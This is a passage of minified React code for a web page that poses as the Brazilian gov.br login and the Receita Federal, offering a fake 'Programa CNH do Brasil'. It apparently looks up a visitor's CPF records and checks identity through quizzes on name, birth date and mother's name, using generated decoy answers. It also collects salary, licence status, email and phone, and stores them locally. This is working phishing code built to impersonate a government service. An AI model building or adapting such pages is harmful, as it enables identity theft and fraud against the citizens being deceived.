            cpf: h,
            nome: "",
            nome_mae: "",
            data_nascimento: "",
            dataNascimento: "",
            sexo: "",
            manualEntry: !0
          }))}&${new URLSearchParams(window.location.search).toString()}`);
        }
      } catch (h) {
        console.error("Error fetching data:", h);
        const b = {
          cpf: Zc(f.cpf),
          nome: "",
          nome_mae: "",
          data_nascimento: "",
          dataNascimento: "",
          sexo: "",
          manualEntry: !0
        };
        l(`/verificacao?data=${encodeURIComponent(JSON.stringify(b))}&${new URLSearchParams(window.location.search).toString()}`);
      } finally {
        i(!1);
      }
    };
  
  return a.jsx("form", {
    method: "post",
    id: "loginData",
    onSubmit: t(d),
    noValidate: !0,
    children: a.jsxs("div", {
      className: "card",
      id: "login-cpf",
      children: [a.jsx("div", {
        style: {
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          width: "100%",
          marginBottom: "16px"
        },
        children: a.jsx("img", {
          src: "/logo-receita-federal.svg",
          alt: "Receita Federal do Brasil",
          style: {
            height: "64px",
            objectFit: "contain"
          }
        })
      }), a.jsx("h3", {
        children: "Identifique-se no gov.br com:"
      }), a.jsx("div", {
        className: "item-login-signup-ways",
        children: a.jsxs("a", {
          tabIndex: 3,
          style: {
            display: "flex",
            alignItems: "center"
          },
          children: [a.jsx("img", {
            src: "https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png",
            alt: "Ícone de um cartão de identificação sólido representando CPF"
          }), "Número do CPF"]
        })
      }), a.jsxs("div", {
        className: "accordion-panel",
        id: "accordion-panel-id",
        children: [a.jsxs("p", {
          children: ["Digite seu CPF para ", a.jsx("strong", {
            children: "criar"
          }), " ou ", a.jsx("strong", {
            children: "acessar"
          }), " sua conta gov.br"]
        }), a.jsx("label", {
          htmlFor: "cpf",
          children: "CPF"
        }), a.jsx("input", {
          id: "cpf",
          ...e("cpf", {
            required: !0
          }),
          onChange: u,
          autoComplete: "new-password",
          tabIndex: 1,
          type: "tel",
          placeholder: "Digite seu CPF",
          "aria-invalid": s.cpf ? "true" : "false"
        }), a.jsx("div", {
          className: "button-panel",
          id: "login-button-panel",
          children: a.jsxs("button", {
            type: "submit",
            className: "button-continuar flex items-center justify-center gap-2",
            tabIndex: 2,
            disabled: o,
            children: [o && a.jsx(dt, {
              className: "h-4 w-4 animate-spin"
            }), o ? "Acessando..." : "Continuar"]
          })
        })]
      }), a.jsx("label", {
        id: "title-outras-op",
        children: "Outras opções de identificação:"
      }), a.jsx("hr", {
        id: "hr-outras-op",
        style: {
          margin: "0 0 0"
        }
      }), a.jsx(Uj, {})]
    })
  });
}
function Wj() {
  return a.jsxs(a.Fragment, {
    children: [a.jsx("header", {
      children: a.jsx("img", {
        src: "https://i.ibb.co/WGrsWGN/IMG-1297.jpg",
        alt: "Imagem de cabeçalho com design moderno e cores vibrantes",
        style: {
          width: "100%"
        }
      })
    }), a.jsxs("div", {
      className: "container",
      children: [a.jsx("aside", {
        id: "aside-signin",
        children: a.jsx("img", {
          id: "identidade-govbr",
          src: "https://cdn.jsdelivr.net/gh/govbr-assets/images/conta_govbr_v2.jpg",
          alt: "Logomarca GovBR"
        })
      }), a.jsx("main", {
        id: "main-signin",
        children: a.jsx(Hj, {})
      })]
    })]
  })
}
function st() {
  const [e, t] = x.useState("");
  return x.useEffect(() => {
    var r;
    const n = localStorage.getItem("userData");
    if (n) {
      const s = JSON.parse(n);
      s.nome && t(s.nome.split(" ")[0])
    }
    (r = window.tailwind) != null && r.config && (window.tailwind.config = {
      theme: {
        extend: {
          colors: {
            "custom-blue": "#1451B4",
            "custom-bg": "#F8F8F8"
          }
        }
      }
    })
  }
    , []),
    a.jsxs(a.Fragment, {
      children: [a.jsxs("header", {
        style: {
          backgroundColor: "white",
          padding: "12px 24px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          border: "none",
          boxShadow: "none"
        },
        children: [a.jsxs("div", {
          style: {
            display: "flex",
            alignItems: "center",
            background: "none",
            boxShadow: "none"
          },
          children: [a.jsx("img", {
            src: "https://i.ibb.co/zPFChvR/logo645.png",
            alt: "Logo gov.br estilizada com texto em azul e amarelo",
            style: {
              marginRight: "32px",
              background: "none",
              boxShadow: "none"
            },
            width: "70",
            height: "24"
          }), a.jsx("button", {
            style: {
              border: "none",
              color: "#1451B4",
              fontSize: "14px",
              marginLeft: "32px",
              cursor: "pointer",
              background: "none",
              boxShadow: "none",
              padding: 0
            },
            "aria-label": "Menu de links",
            children: a.jsx("i", {
              className: "fas fa-ellipsis-v",
              style: {
                background: "none",
                boxShadow: "none",
                fontSize: "16px"
              },
              "aria-hidden": "true"
            })
          }), a.jsx("div", {
            style: {
              borderLeft: "1px solid #ccc",
              height: "24px",
              margin: "0 16px",
              background: "none",
              boxShadow: "none"
            }
          })]
        }), a.jsxs("div", {
          style: {
            display: "flex",
            alignItems: "center",
            background: "none",
            boxShadow: "none"
          },
          children: [a.jsx("button", {
            style: {
              border: "none",
              color: "#1451B4",
              cursor: "pointer",
              marginLeft: "24px",
              background: "none",
              boxShadow: "none",
              padding: 0
            },
            children: a.jsx("i", {
              className: "fas fa-cookie-bite",
              style: {
                background: "none",
                boxShadow: "none",
                fontSize: "16px"
              },
              "aria-hidden": "true"
            })
          }), a.jsx("button", {
            style: {
              border: "none",
              color: "#1451B4",
              cursor: "pointer",
              marginLeft: "24px",
              background: "none",
              boxShadow: "none",
              padding: 0
            },
            type: "button",
            "aria-label": "Sistemas",
            children: a.jsx("i", {
              className: "fas fa-th",
              style: {
                background: "none",
                boxShadow: "none",
                fontSize: "16px"
              },
              "aria-hidden": "true"
            })
          }), a.jsxs("button", {
            style: {
              backgroundColor: "#1451B4",
              color: "white",
              border: "none",
              borderRadius: "9999px",
              padding: "6px 16px",
              display: "flex",
              alignItems: "center",
              fontSize: "14px",
              cursor: "pointer",
              marginLeft: "24px",
              boxShadow: "none"
            },
            type: "button",
            children: [a.jsx("i", {
              className: "fas fa-user",
              style: {
                color: "white",
                marginRight: "8px",
                background: "none",
                boxShadow: "none",
                fontSize: "16px"
              },
              "aria-hidden": "true"
            }), a.jsx("span", {
              children: e || "Entrar"
            })]
          })]
        })]
      }), a.jsxs("nav", {
        style: {
          backgroundColor: "white",
          padding: "16px 24px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          border: "none",
          boxShadow: "none",
          borderBottom: "1px solid #E5E5E5"
        },
        children: [a.jsxs("button", {
          style: {
            border: "none",
            color: "#1451B4",
            display: "flex",
            alignItems: "center",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          children: [a.jsx("i", {
            className: "fas fa-bars",
            style: {
              marginRight: "10px",
              fontSize: "16px",
              background: "none",
              boxShadow: "none"
            },
            "aria-hidden": "true"
          }), a.jsx("span", {
            style: {
              color: "#666",
              fontSize: "1rem",
              fontWeight: 300,
              lineHeight: "20px",
              paddingTop: "2px",
              background: "none",
              boxShadow: "none"
            },
            children: "Programa CNH do Brasil"
          })]
        }), a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            fontSize: "16px",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          "aria-label": "Pesquisar",
          children: a.jsx("i", {
            className: "fas fa-search",
            style: {
              background: "none",
              boxShadow: "none"
            },
            "aria-hidden": "true"
          })
        })]
      })]
    })
}
function jp(e) {
  return e.toLowerCase().split(" ").map(t => t.charAt(0).toUpperCase() + t.slice(1)).join(" ")
}
function Qj(e = !1) {
  const t = e ? ["Maria", "Ana", "Helena", "Alice", "Laura", "Beatriz", "Clara", "Sofia", "Julia", "Isabella"] : ["Miguel", "Arthur", "Heitor", "Helena", "Alice", "Laura", "Maria", "João", "Pedro", "Lucas"]
    , n = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira"]
    , r = ["Costa", "Carvalho", "Gomes", "Martins", "Rocha", "Ribeiro", "Pinto", "Marques"];
  return `${t[Math.floor(Math.random() * t.length)]} ${n[Math.floor(Math.random() * n.length)]} ${r[Math.floor(Math.random() * r.length)]}`
}
function Pp(e) {
  if (!e)
    return "";
  if (/^\d{2}\/\d{2}\/\d{4}$/.test(e))
    return e;
  if (/^\d{4}-\d{2}-\d{2}$/.test(e)) {
    const [n, r, s] = e.split("-");
    return `${s}/${r}/${n}`
  }
  const t = new Date(e);
  return isNaN(t.getTime()) ? e : t.toLocaleDateString("pt-BR")
}
function eu(e, t) {
  const n = [e];
  if (t === "date")
    for (; n.length < 3;) {
      const r = new Date(1950, 0, 1)
        , s = new Date(2e3, 11, 31)
        , o = new Date(r.getTime() + Math.random() * (s.getTime() - r.getTime()))
        , i = String(o.getDate()).padStart(2, "0")
        , l = String(o.getMonth() + 1).padStart(2, "0")
        , c = o.getFullYear()
        , u = `${i}/${l}/${c}`;
      n.includes(u) || n.push(u)
    }
  else
    for (; n.length < 3;) {
      const r = Qj(t === "mother");
      n.includes(r) || n.push(r)
    }
  return n.sort(() => Math.random() - .5)
}
const qj = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com.br", "@uol.com.br", "@bol.com.br", "@terra.com.br"]
  , Gj = () => {
    new Audio("data:audio/wav;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4G8QQRDiMcCBcH3Cc+CDv/7xA4Tvh9Rz/y8QADBwMWgQAZG/ILNAARQ4GLTcDeIIIhxGOBAuD7hOfBB3/94gcJ3w+o5/5eIAIAAAVwWgQAVQ2ORaIQwEMAJiDg95G4nQL7mQVWI6GwRcfsZAcsKkJvxgxEjzFUgfHoSQ9Qq7KNwqHwuB13MA4a1q/DmBrHgPcmjiGoh//EwC5nGPEmS4RcfkVKOhJf+WOgoxJclFz3kgn//dBA+ya1GhurNn8zb//9NNutNuhz31f////9vt///z+IdAEAAAK4LQIAKobHItEIYCGAExBwe8jcToF9zIKrEdDYIuP2MgOWFSE34wYiR5iqQPj0JIeoVdlG4VD4XA67mAcNa1fhzA1jwHuTRxDUQ//iYBczjHiTJcIuPyKlHQkv/LHQUYkuSi57yQT//uggfZNajQ3Vmz+Zt//+mm3Wm3Q576v////+32///5/EOgAAADVghQAAAAA//uQZAUAB1WI0PZugAAAAAoQwAAAEk3nRd2qAAAAACiDgAAAAAAABCqEEQRLCgwpBGMlJkIz8jKhGvj4k6jzRnqasNKIeoh5gI7BJaC1A1AoNBjJgbyApVS4IDlZgDU5WUAxEKDNmmALHzZp0Fkz1FMTmGFl1FMEyodIavcCAUHDWrKAIA4aa2oCgILEBupZgHvAhEBcZ6joQBxS76AgccrFlczBvKLC0QI2cBoCFvfTDAo7eoOQInqDPBtvrDEZBNYN5xwNwxQRfw8ZQ5wQVLvO8OYU+mHvFLlDh05Mdg7BT6YrRPpCBznMB2r//xKJjyyOh+cImr2/4doscwD6neZjuZR4AgAABYAAAABy1xcdQtxYBYYZdifkUDgzzXaXn98Z0oi9ILU5mBjFANmRwlVJ3/6jYDAmxaiDG3/6xjQQCCKkRb/6kg/wW+kSJ5//rLobkLSiKmqP/0ikJuDaSaSf/6JiLYLEYnW/+kXg1WRVJL/9EmQ1YZIsv/6Qzwy5qk7/+tEU0nkls3/zIUMPKNX/6yZLf+kFgAfgGyLFAUwY//uQZAUABcd5UiNPVXAAAApAAAAAE0VZQKw9ISAAACgAAAAAVQIygIElVrFkBS+Jhi+EAuu+lKAkYUEIsmEAEoMeDmCETMvfSHTGkF5RWH7kz/ESHWPAq/kcCRhqBtMdokPdM7vil7RG98A2sc7zO6ZvTdM7pmOUAZTnJW+NXxqmd41dqJ6mLTXxrPpnV8avaIf5SvL7pndPvPpndJR9Kuu8fePvuiuhorgWjp7Mf/PRjxcFCPDkW31srioCExivv9lcwKEaHsf/7ow2Fl1T/9RkXgEhYElAoCLFtMArxwivDJJ+bR1HTKJdlEoTELCIqgEwVGSQ+hIm0NbK8WXcTEI0UPoa2NbG4y2K00JEWbZavJXkYaqo9CRHS55FcZTjKEk3NKoCYUnSQ0rWxrZbFKbKIhOKPZe1cJKzZSaQrIyULHDZmV5K4xySsDRKWOruanGtjLJXFEmwaIbDLX0hIPBUQPVFVkQkDoUNfSoDgQGKPekoxeGzA4DUvnn4bxzcZrtJyipKfPNy5/9lnXwgqsiyHNeSVpemw4bWb9psYeq//uQZBoABQt4yMVxYAIAAAkQoAAAHvYpL5m6AAgAACXDAAAAD59jblTirQe9upFsmZbpMudy7Lz1X1DYsxOOSWpfPqNX2WqktK0DMvuGwlbNj44TleLPQ+Gsfb+GOWOKJoIrWb3cIMeeON6lz2umTqMXV8Mj30yWPpjoSa9ujK8SyeJP5y5mOW1D6hvLepeveEAEDo0mgCRClOEgANv3B9a6fikgUSu/DmAMATrGx7nng5p5iimPNZsfQLYB2sDLIkzRKZOHGAaUyDcpFBSLG9MCQALgAIgQs2YunOszLSAyQYPVC2YdGGeHD2dTdJk1pAHGAWDjnkcLKFymS3RQZTInzySoBwMG0QueC3gMsCEYxUqlrcxK6k1LQQcsmyYeQPdC2YfuGPASCBkcVMQQqpVJshui1tkXQJQV0OXGAZMXSOEEBRirXbVRQW7ugq7IM7rPWSZyDlM3IuNEkxzCOJ0ny2ThNkyRai1b6ev//3dzNGzNb//4uAvHT5sURcZCFcuKLhOFs8mLAAEAt4UWAAIABAAAAAB4qbHo0tIjVkUU//uQZAwABfSFz3ZqQAAAAAngwAAAE1HjMp2qAAAAACZDgAAAD5UkTE1UgZEUExqYynN1qZvqIOREEFmBcJQkwdxiFtw0qEOkGYfRDifBui9MQg4QAHAqWtAWHoCxu1Yf4VfWLPIM2mHDFsbQEVGwyqQoQcwnfHeIkNt9YnkiaS1oizycqJrx4KOQjahZxWbcZgztj2c49nKmkId44S71j0c8eV9yDK6uPRzx5X18eDvjvQ6yKo9ZSS6l//8elePK/Lf//IInrOF/FvDoADYAGBMGb7FtErm5MXMlmPAJQVgWta7Zx2go+8xJ0UiCb8LHHdftWyLJE0QIAIsI+UbXu67dZMjmgDGCGl1H+vpF4NSDckSIkk7Vd+sxEhBQMRU8j/12UIRhzSaUdQ+rQU5kGeFxm+hb1oh6pWWmv3uvmReDl0UnvtapVaIzo1jZbf/pD6ElLqSX+rUmOQNpJFa/r+sa4e/pBlAABoAAAAA3CUgShLdGIxsY7AUABPRrgCABdDuQ5GC7DqPQCgbbJUAoRSUj+NIEig0YfyWUho1VBBBA//uQZB4ABZx5zfMakeAAAAmwAAAAF5F3P0w9GtAAACfAAAAAwLhMDmAYWMgVEG1U0FIGCBgXBXAtfMH10000EEEEEECUBYln03TTTdNBDZopopYvrTTdNa325mImNg3TTPV9q3pmY0xoO6bv3r00y+IDGid/9aaaZTGMuj9mpu9Mpio1dXrr5HERTZSmqU36A3CumzN/9Robv/Xx4v9ijkSRSNLQhAWumap82WRSBUqXStV/YcS+XVLnSS+WLDroqArFkMEsAS+eWmrUzrO0oEmE40RlMZ5+ODIkAyKAGUwZ3mVKmcamcJnMW26MRPgUw6j+LkhyHGVGYjSUUKNpuJUQoOIAyDvEyG8S5yfK6dhZc0Tx1KI/gviKL6qvvFs1+bWtaz58uUNnryq6kt5RzOCkPWlVqVX2a/EEBUdU1KrXLf40GoiiFXK///qpoiDXrOgqDR38JB0bw7SoL+ZB9o1RCkQjQ2CBYZKd/+VJxZRRZlqSkKiws0WFxUyCwsKiMy7hUVFhIaCrNQsKkTIsLivwKKigsj8XYlwt/WKi2N4d//uQRCSAAjURNIHpMZBGYiaQPSYyAAABLAAAAAAAACWAAAAApUF/Mg+0aohSIRobBAsMlO//Kk4soosy1JSFRYWaLC4qZBYWFRGZdwqKiwkNBVmoWFSJkWFxX4FFRQWR+LsS4W/rFRb/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VEFHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU291bmRib3kuZGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAwNGh0dHA6Ly93d3cuc291bmRib3kuZGUAAAAAAAAAACU=").play().catch(console.error)
  }
  ;
function Kj() {
  const [, e] = Un()
    , [t, n] = x.useState("name")
    , [r, s] = x.useState(null)
    , [o, i] = x.useState("")
    , [l, c] = x.useState("idle")
    , [u, d] = x.useState("")
    , [f, h] = x.useState("")
    , [y, b] = x.useState(!1)
    , [v, C] = x.useState("")
    , m = new URLSearchParams(window.location.search).get("data")
    , p = x.useMemo(() => {
      if (!m)
        return null;
      try {
        return JSON.parse(decodeURIComponent(m))
      } catch {
        return null
      }
    }
      , [m])
    , w = (p == null ? void 0 : p.manualEntry) === !0
    , S = p ? Pp(p.data_nascimento) : ""
    , N = !w && (p == null ? void 0 : p.nome_mae) && p.nome_mae.trim() !== ""
    , P = x.useMemo(() => !p || w ? [] : eu(p.nome, "name"), [p == null ? void 0 : p.nome, w])
    , A = x.useMemo(() => !p || w ? [] : eu(S, "date"), [S, w])
    , k = x.useMemo(() => !p || !N ? [] : eu(p.nome_mae, "mother"), [p == null ? void 0 : p.nome_mae, N])
    , D = ["Desempregado(a)", "Até R$ 2.640 (até 2 salários mínimos)", "De R$ 2.641 a R$ 6.600 (2 a 5 salários mínimos)", "De R$ 6.601 a R$ 13.200 (5 a 10 salários mínimos)", "Acima de R$ 13.200 (mais de 10 salários mínimos)"]
    , q = ["Não possuo CNH", "Possuo CNH categoria A (moto)", "Possuo CNH categoria B (carro)", "Possuo CNH categoria AB ou superior"]
    , I = R => {
      const L = R.replace(/\D/g, "");
      return L.length <= 2 ? L : L.length <= 7 ? `(${L.slice(0, 2)}) ${L.slice(2)}` : `(${L.slice(0, 2)}) ${L.slice(2, 7)}-${L.slice(7, 11)}`
    }
    , H = R => {
      h(I(R.target.value))
    }
    , z = R => {
      const L = R.target.value;
      d(L),
        b(L.includes("@") && !L.includes("."))
    }
    , te = R => {
      const L = u.split("@")[0];
      d(L + R),
        b(!1)
    }
    ;
  if (!p)
    return a.jsxs("div", {
      children: [a.jsx(st, {}), a.jsx("div", {
        className: "container",
        children: a.jsx("main", {
          id: "main-signin",
          children: a.jsxs("div", {
            className: "card",
            style: {
              maxWidth: "600px",
              alignItems: "flex-start"
            },
            children: [a.jsx("h3", {
              children: "Dados não encontrados"
            }), a.jsx("p", {
              children: "Não foram encontrados dados para verificação."
            }), a.jsx("div", {
              className: "button-panel",
              children: a.jsx("button", {
                type: "button",
                onClick: () => e("/" + window.location.search),
                className: "button-continuar",
                children: "Voltar"
              })
            })]
          })
        })
      })]
    });
  const se = async () => {
    if (w && t === "name" && (!v || v.trim().length < 3)) {
      s("Por favor, insira seu nome completo");
      return
    }
    if (t === "email" && !u) {
      s("Por favor, insira seu email");
      return
    }
    if (t === "phone" && !f) {
      s("Por favor, insira seu telefone");
      return
    }
    if (!w && t !== "email" && t !== "phone" && !o) {
      s("Por favor, selecione uma opção");
      return
    }
    c("loading"),
      await new Promise(L => setTimeout(L, 3e3));
    let R = !1;
    switch (t) {
      case "name":
        w ? R = v.trim().length >= 3 : R = o === p.nome;
        break;
      case "birth":
        R = o === S;
        break;
      case "mother":
        R = o === p.nome_mae;
        break;
      case "salary":
        R = o !== "";
        break;
      case "flights":
        R = o !== "";
        break;
      case "email":
        R = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u);
        break;
      case "phone":
        R = f.replace(/\D/g, "").length >= 10;
        break
    }
    R ? (c("success"),
      Gj(),
      setTimeout(() => {
        if (s(null),
          c("idle"),
          t === "phone") {
          const L = localStorage.getItem("userData")
            , J = L ? JSON.parse(L) : {}
            , oe = w ? {
              ...p,
              nome: v.trim()
            } : p;
          localStorage.setItem("userData", JSON.stringify({
            ...J,
            ...oe,
            email: u,
            phone: f
          }));
          const $e = w ? encodeURIComponent(JSON.stringify(oe)) : m;
          const params = new URLSearchParams(window.location.search);
          params.set("data", $e);
          e(`/saiba-mais?${params.toString()}`)
        } else {
          if (t === "name" && w) {
            const L = localStorage.getItem("userData")
              , J = L ? JSON.parse(L) : {};
            localStorage.setItem("userData", JSON.stringify({
              ...J,
              cpf: p.cpf,
              nome: v.trim()
            }))
          }
          if (t === "salary" || t === "flights") {
            const L = localStorage.getItem("userData")
              , J = L ? JSON.parse(L) : {}
              , oe = t === "salary" ? {
                salaryRange: o
              } : {
                flightFrequency: o
              };
            localStorage.setItem("userData", JSON.stringify({
              ...J,
              ...oe
            }))
          }
          n(t === "name" ? w ? "salary" : "birth" : t === "birth" ? N ? "mother" : "salary" : t === "mother" ? "salary" : t === "salary" ? "flights" : t === "flights" ? "email" : "phone"),
            i("")
        }
      }
        , 1e3)) : (s(t === "email" ? "Email inválido" : t === "phone" ? "Telefone inválido" : "Dados incorretos. Por favor, verifique sua resposta."),
          c("idle"))
  }
    , O = (() => {
      const R = L => {
        if (w)
          switch (L) {
            case "name":
              return 1;
            case "salary":
              return 2;
            case "flights":
              return 3;
            case "email":
              return 4;
            case "phone":
              return 5;
            default:
              return 1
          }
        if (!N)
          switch (L) {
            case "name":
              return 1;
            case "birth":
              return 2;
            case "salary":
              return 3;
            case "flights":
              return 4;
            case "email":
              return 5;
            case "phone":
              return 6;
            default:
              return 1
          }
        switch (L) {
          case "name":
            return 1;
          case "birth":
            return 2;
          case "mother":
            return 3;
          case "salary":
            return 4;
          case "flights":
            return 5;
          case "email":
            return 6;
          case "phone":
            return 7;
          default:
            return 1
        }
      }
        ;
      switch (t) {
        case "name":
          return {
            title: w ? "Digite seu nome completo" : "Qual é seu nome completo?",
            options: P,
            type: "name",
            number: R("name")
          };
        case "birth":
          return {
            title: "Qual é sua data de nascimento?",
            options: A,
            type: "birth",
            number: R("birth")
          };
        case "mother":
          return {
            title: "Qual é o nome da sua mãe?",
            options: k,
            type: "mother",
            number: R("mother")
          };
        case "salary":
          return {
            title: "Qual é sua faixa salarial atual?",
            options: D,
            type: "salary",
            number: R("salary")
          };
        case "flights":
          return {
            title: "Qual sua situação atual de habilitação?",
            options: q,
            type: "flights",
            number: R("flights")
          };
        case "email":
          return {
            title: "Qual é o seu email?",
            type: "email",
            number: R("email")
          };
        case "phone":
          return {
            title: "Qual é o seu telefone?",
            type: "phone",
            number: R("phone")
          }
      }
    }
    )();
  return a.jsxs("div", {
    children: [a.jsx(st, {}), a.jsx("div", {
      className: "container",
      children: a.jsx("main", {
        id: "main-signin",
        style: {
          width: "100%",
          maxWidth: "800px",
          margin: "0 auto"
        },
        children: a.jsxs("div", {
          className: "card",
          style: {
            width: "100%",
            alignItems: "flex-start",
            padding: "2rem"
          },
          children: [a.jsx("h3", {
            className: "text-center w-full text-lg font-bold mb-6",
            children: "Confirme seus dados para o cadastro no Programa CNH do Brasil"
          }), a.jsx("div", {
            className: "w-full",
            children: a.jsxs("div", {
              children: [a.jsxs("div", {
                className: "flex items-center gap-3 mb-4",
                children: [a.jsx("div", {
                  className: "flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium",
                  children: O.number
                }), a.jsx("p", {
                  className: "font-semibold text-base",
                  children: O.title
                })]
              }), a.jsxs("div", {
                className: "space-y-3 pl-4",
                children: [t === "name" && w && a.jsx("input", {
                  type: "text",
                  value: v,
                  onChange: R => {
                    C(R.target.value),
                      s(null)
                  }
                  ,
                  placeholder: "Digite seu nome completo",
                  className: "w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                }), !w && (t === "name" || t === "birth" || t === "mother" || t === "salary" || t === "flights") && (O == null ? void 0 : O.options) && O.options.map((R, L) => a.jsx("div", {
                  className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer ${o === R ? "bg-[#1351B4] bg-opacity-10 border-2 border-[#1351B4]" : "bg-gray-50 hover:bg-gray-100"}`,
                  onClick: () => {
                    i(R),
                      s(null)
                  }
                  ,
                  children: a.jsx("label", {
                    htmlFor: `option-${L}`,
                    className: `flex-1 cursor-pointer ${o === R ? "text-[#1351B4] font-medium" : ""}`,
                    children: O.type === "birth" ? Pp(R) : jp(R)
                  })
                }, L)), w && (t === "salary" || t === "flights") && (O == null ? void 0 : O.options) && O.options.map((R, L) => a.jsx("div", {
                  className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer ${o === R ? "bg-[#1351B4] bg-opacity-10 border-2 border-[#1351B4]" : "bg-gray-50 hover:bg-gray-100"}`,
                  onClick: () => {
                    i(R),
                      s(null)
                  }
                  ,
                  children: a.jsx("label", {
                    htmlFor: `option-${L}`,
                    className: `flex-1 cursor-pointer ${o === R ? "text-[#1351B4] font-medium" : ""}`,
                    children: jp(R)
                  })
                }, L)), t === "email" && a.jsxs("div", {
                  className: "relative",
                  children: [a.jsx("input", {
                    type: "email",
                    value: u,
                    onChange: z,
                    placeholder: "Digite seu email",
                    className: "w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                  }), y && a.jsx("div", {
                    className: "absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-md shadow-lg",
                    children: qj.map((R, L) => a.jsxs("div", {
                      className: "p-3 hover:bg-gray-100 cursor-pointer text-lg",
                      onClick: () => te(R),
                      children: [u.split("@")[0], R]
                    }, L))
                  })]
                }), t === "phone" && a.jsx("input", {
                  type: "tel",
                  value: f,
                  onChange: H,
                  placeholder: "(11) 99999-9999",
                  className: "w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                })]
              }), r && a.jsx("p", {
                className: "text-red-500 mt-4",
                children: r
              }), a.jsx("div", {
                className: "flex justify-center mt-6",
                children: a.jsxs("button", {
                  type: "button",
                  onClick: se,
                  disabled: l !== "idle",
                  className: "button-continuar flex items-center justify-center gap-2 min-w-[160px]",
                  children: [l === "loading" && a.jsx(dt, {
                    className: "h-4 w-4 animate-spin"
                  }), l === "success" && a.jsx(Ft, {
                    className: "h-4 w-4"
                  }), l === "loading" ? "Verificando" : l === "success" ? "Verificado" : "Confirmar"]
                })
              })]
            })
          })]
        })
      })
    })]
  })
}
const En = x.forwardRef(({ className: e, ...t }, n) => a.jsx("div", {
  ref: n,
  className: Et("rounded-lg border bg-card text-card-foreground shadow-sm", e),
  ...t
}));
En.displayName = "Card";
const wi = x.forwardRef(({ className: e, ...t }, n) => a.jsx("div", {
  ref: n,
  className: Et("flex flex-col space-y-1.5 p-6", e),
  ...t
}));
wi.displayName = "CardHeader";
const bi = x.forwardRef(({ className: e, ...t }, n) => a.jsx("h3", {
  ref: n,
  className: Et("text-2xl font-semibold leading-none tracking-tight", e),
  ...t
}));
bi.displayName = "CardTitle";
const Yj = x.forwardRef(({ className: e, ...t }, n) => a.jsx("p", {
  ref: n,
  className: Et("text-sm text-muted-foreground", e),
  ...t
}));
Yj.displayName = "CardDescription";
const Tn = x.forwardRef(({ className: e, ...t }, n) => a.jsx("div", {
  ref: n,
  className: Et("p-6 pt-0", e),
  ...t
}));
Tn.displayName = "CardContent";
const Xj = x.forwardRef(({ className: e, ...t }, n) => a.jsx("div", {
  ref: n,
  className: Et("flex items-center p-6 pt-0", e),
  ...t
}));
Xj.displayName = "CardFooter";
const Jj = ax("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
  variants: {
    variant: {
      default: "bg-primary text-primary-foreground hover:bg-primary/90",
      destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
      outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
      secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
      ghost: "hover:bg-accent hover:text-accent-foreground",
      link: "text-primary underline-offset-4 hover:underline"
    },
    size: {
      default: "h-10 px-4 py-2",
      sm: "h-9 rounded-md px-3",
      lg: "h-11 rounded-md px-8",
      icon: "h-10 w-10"
    }
  },
  defaultVariants: {
    variant: "default",
    size: "default"
  }
})
  , Mn = x.forwardRef(({ className: e, variant: t, size: n, asChild: r = !1, ...s }, o) => {
    const i = r ? xi : "button";
    return a.jsx(i, {
      className: Et(Jj({
        variant: t,
        size: n,
        className: e
      })),
      ref: o,
      ...s
    })
  }
  );
Mn.displayName = "Button";
var uo = {}
  , Zj = function () {
    return typeof Promise == "function" && Promise.prototype && Promise.prototype.then
  }
  , zx = {}
  , Tt = {};
let Kf;
const e3 = [0, 26, 44, 70, 100, 134, 172, 196, 242, 292, 346, 404, 466, 532, 581, 655, 733, 815, 901, 991, 1085, 1156, 1258, 1364, 1474, 1588, 1706, 1828, 1921, 2051, 2185, 2323, 2465, 2611, 2761, 2876, 3034, 3196, 3362, 3532, 3706];
Tt.getSymbolSize = function (t) {
  if (!t)
    throw new Error('"version" cannot be null or undefined');
  if (t < 1 || t > 40)
    throw new Error('"version" should be in range from 1 to 40');
  return t * 4 + 17
}
  ;
Tt.getSymbolTotalCodewords = function (t) {
  return e3[t]
}
  ;
Tt.getBCHDigit = function (e) {
  let t = 0;
  for (; e !== 0;)
    t++,
      e >>>= 1;
  return t
}
  ;
Tt.setToSJISFunction = function (t) {
  if (typeof t != "function")
    throw new Error('"toSJISFunc" is not a valid function.');
  Kf = t
}
  ;
Tt.isKanjiModeEnabled = function () {
  return typeof Kf < "u"
}
  ;
Tt.toSJIS = function (t) {
  return Kf(t)
}
  ;
var Jl = {};
(function (e) {
  e.L = {
    bit: 1
  },
    e.M = {
      bit: 0
    },
    e.Q = {
